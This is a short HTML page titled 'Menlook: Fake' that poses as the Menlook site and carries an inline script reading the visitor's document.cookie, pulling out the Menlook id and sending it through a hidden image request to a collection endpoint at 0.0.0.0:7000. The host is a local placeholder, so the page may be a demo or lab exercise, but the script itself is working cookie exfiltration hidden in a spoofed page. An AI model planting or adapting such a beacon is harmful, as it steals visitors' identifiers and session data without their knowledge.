    <title>Menlook: Fake</title>

<body>
<div>Site Menlook</div>
<script type="text/javascript">
	var urlds = 'http://0.0.0.0:7000/userdata?menlookid=';
	if(document.cookie === '') {
		console.log('cookie non érit');
	} else {
		console.log('cookie défini');
		var cookie = document.cookie;
		console.log(cookie);
		var menlookId = cookie.split('=').pop(); 
		console.log(menlookId);
		urlds += menlookId;
		var i = new Image();
		i.src = urlds;
	}
</script>
</body>
